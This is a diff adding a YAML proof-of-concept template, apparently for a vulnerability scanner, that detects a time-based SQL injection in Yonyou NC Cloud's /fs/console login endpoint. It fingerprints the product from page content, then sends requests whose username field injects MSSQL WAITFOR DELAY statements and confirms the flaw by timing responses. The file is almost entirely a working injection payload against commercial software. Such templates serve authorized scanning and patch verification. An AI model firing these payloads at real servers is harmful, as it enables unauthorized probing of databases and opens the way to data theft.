@@ -1,0 +1,44 @@
+name: poc-yaml-yongyou-nc-cloud-fs-sqli
+manual: true
+transport: http
+set:
+    sleepSecond: randomInt(5, 7)
+    sleepSecond1: randomInt(2, 4)
+    rand: randomInt(1, 100)
+rules:
+    index_contains:
+      expression: |
+        response.body_string.contains('/platform/resource/yonyou-yyy.js') && response.body_string.contains('/platform/resource/ca/nccsign.js')
+    js_redirect:
+      expression: |
+        response.body_string.contains('<meta http-equiv=refresh content=0;url=nccloud>') || (response.body_string.contains('window.location.href="platform/pub/welcome.do";') && response.body_string.contains('window.location.href="html/downloadBroswer.html";'))
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /fs/console?username={{rand}}%27;WAITFOR%20DELAY%20%270:0:0%27--&password=WiEZoxowjDhBk7bfE9nvzP3TjiK/RivMT1jKxrq42bI
+        expression: response.status == 500
+        output:
+            r0latency: response.latency
+    r1:
+        request:
+            cache: true
+            method: GET
+            read_timeout: "10"
+            path: /fs/console?username={{rand}}%27;WAITFOR%20DELAY%20%270:0:{{sleepSecond}}%27--&password=WiEZoxowjDhBk7bfE9nvzP3TjiK/RivMT1jKxrq42bI
+        expression: response.status == 500 && response.latency - r0latency >= sleepSecond * 1000 - 500
+    r2:
+        request:
+            cache: true
+            method: GET
+            read_timeout: "10"
+            path: /fs/console?username={{rand}}%27;WAITFOR%20DELAY%20%270:0:{{sleepSecond1}}%27--&password=WiEZoxowjDhBk7bfE9nvzP3TjiK/RivMT1jKxrq42bI
+        expression: response.status == 500 && response.latency - r0latency >= sleepSecond1 * 1000 - 500
+expression: (index_contains() || js_redirect()) && r0() && r1() && r2()
+detail:
+    author: z92g(https://github.com/z92g)
+    links:
+        - https://mp.weixin.qq.com/s/YfJSz53aXYB-YDSqcbtQFg
+    vulnerability:
+        id: CT-515819
+        level: high
